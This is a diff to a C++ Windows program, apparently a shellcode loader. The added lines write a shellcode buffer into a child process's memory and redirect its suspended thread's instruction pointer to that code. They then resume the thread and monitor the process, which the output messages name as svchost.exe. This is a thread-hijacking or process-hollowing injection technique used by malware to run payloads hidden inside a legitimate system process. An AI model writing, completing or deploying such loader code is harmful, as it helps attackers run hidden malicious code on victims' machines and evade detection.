@@ -8,6 +8,8 @@
 //
 // ============ END LOADER ============
 
+#include <cwchar>
+#include <exception>
 #include <windows.h>
 #include <winternl.h>
 #include <stdint.h>
@@ -185,4 +187,42 @@ int main()
         return 1;
     }
 
+    // Écrire le shellcode en mémoire distante
+    if (!WriteProcessMemory(pi.hProcess, remote, g_shellcode, g_shellcode_len, NULL)) {
+        TerminateProcess(pi.hProcess, 1);
+        return 1;
+    }
+
+    
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+
+    ctx.Rip = (DWORD64)remote;   // Windows x64
+    ctx.Rax = (DWORD64)remote;   
+
+    SetThreadContext(pi.hThread, &ctx);
+    ResumeThread(pi.hThread);
+
+    // --- 6. Monitoring ---
+    while (true)
+    {
+        DWORD exitCode;
+        GetExitCodeProcess(pi.hProcess, &exitCode);
+        if (exitCode == STILL_ACTIVE)
+        {
+            wprintf(L"[+] Process is still running....\n");
+            Sleep(5000);
+        }
+        else
+        {
+            wprintf(L"[-] Process <svchost.exe> encountered an external error (code %lu), go to eventvwr.msc.\n", exitCode);
+            break;
+        }
+    }
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
+}
    
